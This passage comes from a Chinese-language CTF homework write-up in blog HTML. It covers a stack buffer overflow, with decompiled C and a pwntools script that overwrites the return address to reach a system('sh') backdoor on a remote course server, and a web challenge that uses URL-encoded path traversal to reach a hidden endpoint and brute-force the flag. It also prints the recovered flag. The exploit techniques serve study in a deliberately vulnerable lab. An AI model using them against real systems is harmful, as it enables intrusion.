&lt;li&gt;&lt;strong&gt;PIE&lt;/strong&gt;: Position-Independent Executable，若沒有開啟 PIE，程式載入的記憶體位址會與編譯時的位址相同，就等同我們在 gdb 等工具上看到的記憶體位址。若開啟 PIE，程式載入則是隨機的。&lt;/li&gt;
&lt;li&gt;這題的這兩個保護措施故意被關掉了，所以可以進行 bof 攻擊。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Function &lt;em&gt;debug&lt;/em&gt; is a webshell, but cannot reach&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;透過 objdump gdb 等工具，我們可以看到程式除了 main 方法還有一個 debug 方法，透過 IDA 反組譯看到他的原始碼是一個 shell，感謝助教開後門xdd；不過沒有方法呼叫到 debug 這題的伺服器又開在遠端，所以只能靠 bof 了。&lt;/li&gt;
&lt;li&gt;__isoc99_scanf 沒有設定讀取的字串長度，會一路讀到 EOF，沒能擋下 bof。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__cdecl&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+0h] [rbp-20h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Hey, nice to meet you!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Just wanna ask, which linux distribution are you using?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aOhhSweetByTheW&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Found address of funtcion debug locates on 0x4011dd&lt;/strong&gt;&lt;br&gt;
透過 objdump gdb IDA 等工具可以看到 debug 函數的進入點位置為 &lt;code&gt;0x4011dd&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Found address of variable &lt;em&gt;char v4[32]&lt;/em&gt; has a size of 32 bytes&lt;/strong&gt;&lt;br&gt;
從 IDA 的 stack 功能可以看到 main 函數中只有 var_20 這個變數，他佔有 32 bytes 的空間；我們需要先蓋掉 var_20 和 saved register 的記憶體才能 overflow 到 return address。如下圖。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不重要的部分 32 + 8 = 40 bytes&lt;/li&gt;
&lt;li&gt;return address = 8 bytes，可以藉由 &lt;code&gt;p64(0x4011dd)&lt;/code&gt; 方法把字串補齊成 8 bytes 大小。
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 325; 
			flex-basis: 780px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-stackofmain.png&#34; data-size=&#34;1132x348&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-stackofmain.png&#34;
			width=&#34;1132&#34;
			height=&#34;348&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-stackofmain_huac0f2e46c9c9e130a7fc40ba23bde3ea_32243_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-stackofmain_huac0f2e46c9c9e130a7fc40ba23bde3ea_32243_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;stack frame of main&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;stack frame of main&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 183; 
			flex-basis: 439px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-bof.png&#34; data-size=&#34;1175x641&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-bof.png&#34;
			width=&#34;1175&#34;
			height=&#34;641&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-bof_hu085f745bd6e79e84764ecee1e2a511f1_156871_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-bof_hu085f745bd6e79e84764ecee1e2a511f1_156871_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;poc of bof&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;poc of bof&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Exploit script&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 0
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# c = process(&amp;#39;./bof&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;up.zoolab.org&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;backdoor_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4011dd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;backdoor_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#0x4011dd -&amp;gt; function: debug() -&amp;gt; get webshell: system(&amp;#34;sh&amp;#34;) -&amp;gt; grep -r FLAG{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# FLAG{d1d_y0u_ju5t_s4y_w1nd0w5?}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web---api-leak&#34;&gt;Web - API leak&lt;/h2&gt;
&lt;p&gt;題目公布的前後端的程式碼幾乎就包含所有線索了，原本想說先用 nmap recon 一下去戳看看有沒有隱藏的 service，也用字典檔找隱藏 endpoint，但毫無所獲，乖乖看懂程式碼然後解題吧。&lt;/p&gt;
&lt;p&gt;👉 &lt;a class=&#34;link&#34; href=&#34;http://splitline.tw:5000/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://splitline.tw:5000/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用工具:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;recon: nmap&lt;/li&gt;
&lt;li&gt;exploit: F12、postman、python-requests&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;API flow &amp;amp; my attack flow&lt;/strong&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 110; 
			flex-basis: 265px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-api-flow.png&#34; data-size=&#34;1041x940&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-api-flow.png&#34;
			width=&#34;1041&#34;
			height=&#34;940&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-api-flow_hu735d7e8944c77f5da69747627ac95081_177158_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-api-flow_hu735d7e8944c77f5da69747627ac95081_177158_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Found unused local endpoint&lt;/strong&gt; &lt;em&gt;/looksLikeFlag&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在網頁正常使用下我們都不會呼叫 &amp;ldquo;/looksLikeFlag&amp;rdquo; 這個 api endpoint，仔細看一下後端 express 這兩個 endpoint&amp;rsquo;s url，如果我們能透過 text 變數回到上一層就可以戳到 /looksLikeFlag 了:
&lt;ul&gt;
&lt;li&gt;http://127.0.0.1:7414/api/v1/emoji/${text}&lt;/li&gt;
&lt;li&gt;http://127.0.0.1:7414/api/v1/looksLikeFlag&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;一般而言我們不可能，因為 api 格式就是固定的，但題目故意開一個漏洞讓我們可以由 &lt;code&gt;../&lt;/code&gt; 返回上一層。注意要做 url encoding 規避掉 regex 的 &lt;code&gt;.&lt;/code&gt; 句號檢查。(其實我第一個想到的漏洞是LFI，但這題環境是 nodeJS 不是 php，&lt;code&gt;?file=&lt;/code&gt;這個參數他不收)
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-postman.png&#34; data-size=&#34;1182x637&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-postman.png&#34;
			width=&#34;1182&#34;
			height=&#34;637&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-postman_huad93f68fb4b2ce287b272fee6f115870_50434_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-postman_huad93f68fb4b2ce287b272fee6f115870_50434_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Found response body contain a looksLikeFlag parameter, can &lt;em&gt;brutefource&lt;/em&gt; to retrieve flag digit by digit.&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;FLAG&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./secret.js&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;apiRouter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/looksLikeFlag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 小提示: 照理來說assert只會出現在 unit test 中，暗示 FLAG 只包含這些字元。
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;assert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;FLAG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/^FLAG{[a-z0-9_]+}$/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// includes() 會核對API參數和真實的FLAG，只會回傳 true / false。
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;looksLikeFlag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;FLAG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;includes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最終程式碼:&lt;br&gt;
✅ 小技巧: 善用 string.digits 以及 string.ascii_lowercase。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 0
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
